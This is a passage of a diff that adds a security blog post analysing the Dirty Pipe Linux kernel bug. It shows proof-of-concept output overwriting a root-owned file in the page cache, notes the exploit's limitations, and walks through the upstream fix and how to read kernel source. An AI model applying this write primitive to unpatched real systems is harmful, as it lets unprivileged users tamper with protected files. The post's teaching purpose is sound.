+&gt; data: b'File pwned by user!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+</code></pre><p>Here we can see that <code>owned by root</code> (starting at index 5 of &ldquo;File owned by root!") has been overwritten with <code>pwned by user</code> in the page cache.</p>
+<p>In the shell we can confirm that the file contents changed for all processes on the system</p>
+<pre tabindex=0><code>user@lkd-debian-qemu:~$ ./poc
+user@lkd-debian-qemu:~$ cat target_file
+File pwned by user!
+user@lkd-debian-qemu:~$ exit
+root@lkd-debian-qemu:~# echo 1 &gt; /proc/sys/vm/drop_caches
+[  232.397273] bash (203): drop_caches: 1
+root@lkd-debian-qemu:~# su user
+user@lkd-debian-qemu:~$ cat target_file
+File owned by root
+</code></pre><p>You can also see that the changes to the file&rsquo;s page cache data are not written back to disk. After clearing the page cache, the old content appears again. But, all other programs would use the modified version from the page cache since the kernel transparently offers you the cached version of the file data (that&rsquo;s the purpose of the page cache).</p>
+<h3 id=limitations>Limitations<a href=#limitations class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>There are some inherent limitations to the writes that we can perform using this technique that are due to implementation of the pipe and page cache that Max Kellermann mentions:</p>
+<blockquote>
+<p>the attacker must have read permissions (because it needs to splice() a page into a pipe)</p>
+</blockquote>
+<blockquote>
+<p>the offset must not be on a page boundary (because at least one byte of that page must have been spliced into the pipe)</p>
+</blockquote>
+<blockquote>
+<p>the write cannot cross a page boundary (because a new anonymous buffer would be created for the rest)</p>
+</blockquote>
+<blockquote>
+<p>the file cannot be resized (because the pipe has its own page fill management and does not tell the page cache how much data has been appended)</p>
+</blockquote>
+<h2 id=approaches-to-understand-the-bug>Approaches to Understand the Bug<a href=#approaches-to-understand-the-bug class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<h3 id=top-down-vs-bottom-up-vs-hybrid>Top Down vs. Bottom Up vs. Hybrid<a href=#top-down-vs-bottom-up-vs-hybrid class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>Given a PoC and a patch there are different approaches to investigate the vulnerability.</p>
+<ol>
+<li>
+<p><strong>Top Down</strong>: find the <code>splice()</code>, <code>write()</code>, <code>read()</code> system call implementation and go deeper.</p>
+</li>
+<li>
+<p><strong>Bottom Up</strong>: have a look at the fix: <a href=https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903>https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903</a></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff>diff --git a/lib/iov_iter.c b/lib/iov_iter.c
+index b0e0acdf96c15e..6dd5330f7a9957 100644
+<span style=color:#f92672>--- a/lib/iov_iter.c
+</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/lib/iov_iter.c
+</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
+</span><span style=color:#75715e></span> 		return 0;
+
+ 	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
+<span style=color:#a6e22e>+	buf-&gt;flags = 0;
+</span><span style=color:#a6e22e></span> 	get_page(page);
+ 	buf-&gt;page = page;
+ 	buf-&gt;offset = offset;
+<span style=color:#75715e>@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
+</span><span style=color:#75715e></span> 			break;
+
+ 		buf-&gt;ops = &amp;default_pipe_buf_ops;
+<span style=color:#a6e22e>+		buf-&gt;flags = 0;
+</span><span style=color:#a6e22e></span> 		buf-&gt;page = page;
+ 		buf-&gt;offset = 0;
+ 		buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);
+</code></pre></div><ul>
+<li>find <code>lib/iov_iter.c</code> (more concrete the functions <code>copy_page_to_iter_pipe()</code> and <code>push_pipe()</code>) and your way back to the system calls.</li>
+</ul>
+</li>
+<li>
+<p><strong>Hybrid</strong>: start from <code>splice()</code> system call but know where we will end (either of the patched functions from above)</p>
+</li>
+</ol>
+<h3 id=linux-kernel-source>Linux Kernel Source<a href=#linux-kernel-source class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>Access to the source code:</p>
+<ul>
+<li><a href=https://github.com/torvalds/linux>https://github.com/torvalds/linux</a> + ctags + cscope (<code>make cscope tags</code>) or an IDE that is capable of creating cross references (might be very resource hungry because of the kernel&rsquo;s size!)</li>
+<li><a href=https://elixir.bootlin.com/linux/v5.17.9/source>https://elixir.bootlin.com/linux/v5.17.9/source</a> (cross references already created + no need for extra tools)</li>
+</ul>
+<p>When reading kernel source code for the first time, you might encounter some obstacles. In general it is easy to get lost and thus you should always keep in mind what it is that you are interested in finding / understanding. We must also understand that it is <em>impossible</em> to understand every line of the code that we look at. Use a best-effort approach to understand the things that get you closer to you goal). You will encounter:</p>
+<ul>
+<li>lots of error checking: in general <em>very</em> interesting, however, here we ignore it (i.e. <code>return -EXYZ</code> code paths)</li>
+<li>many layers of macros, (inlined) function calls and definitions: collect everything and simplify it. Note: you cannot set breakpoints on macros, which might be a problem as well.</li>
+<li>structures full of function pointers:
+<ul>
+<li>for example, look under &ldquo;Referenced in [&mldr;] files&rdquo; on <a href=https://elixir.bootlin.com>https://elixir.bootlin.com</a></li>
+<li>&ldquo;decide&rdquo; for some implementation (in our case ext2 file system)</li>
+</ul>
+</li>
+<li>conditional compilation depending on:
+<ul>
+<li>compile time options: check the config files you used for your build <code>.config</code></li>
+<li>processor architecture: go for <code>x86-64</code> if present, else take the generic version</li>
+</ul>
+</li>
+</ul>
+<h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>TODO mc</p>
+<p>A detailed and streamlined analysis of any bug makes it seem shallow, however, don&rsquo;t get fooled by that impression. This bug happened to some of the best C programmers in the wold, was present for years in one of the most widely used OSs, took a professional programmer weeks to pin down, and making sense of it requires a conceptual understanding of two interacting subsystems of the Linux kernel. Root causing it without a PoC, blogpost, and patch at hand is a task that only few can do accomplish (but maybe this post can play a small role in incrementing this number in the future&mldr; :).
+In general, the nature of this bug makes it a great opportunity for learning about the kernel, and a <em>missing initialization</em> vulnerability is a welcome diversion from the <a href=https://github.com/maddiestone/ConPresentations/blob/master/OffensiveCon2022.RealWorld0days.pdf>(ostensibly) prevailing</a> <em>memory corruption</em> issues. Furthermore, in contrast to, say some out-of-bounds write on the heap, the exploitation of this vulnerability is almost trivial, stability is not issue at all, and it works in the same way across a huge range of systems.
+While the latter points are probably responsible for its huge popularity, the former two make it a good case study for aspiring security researchers that want to get into kernel stuff. We hope that our setup makes understanding this bug more accessible and provides a good preparation for the inevitable bugs to come.</p>
+</div></div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button next">
+<a href=https://lolcads.github.io/posts/2022/06/exploiting_cve_2021_43247/>
+<span class=button__text>Exploiting CVE-2021-43247</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user">
+<span>&copy; lolcads</span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
+</div>
+</div>
+</footer>
+<script src=https://lolcads.github.io/assets/main.js></script>
+<script src=https://lolcads.github.io/assets/prism.js></script>
+</div>
+</body>
+</html>
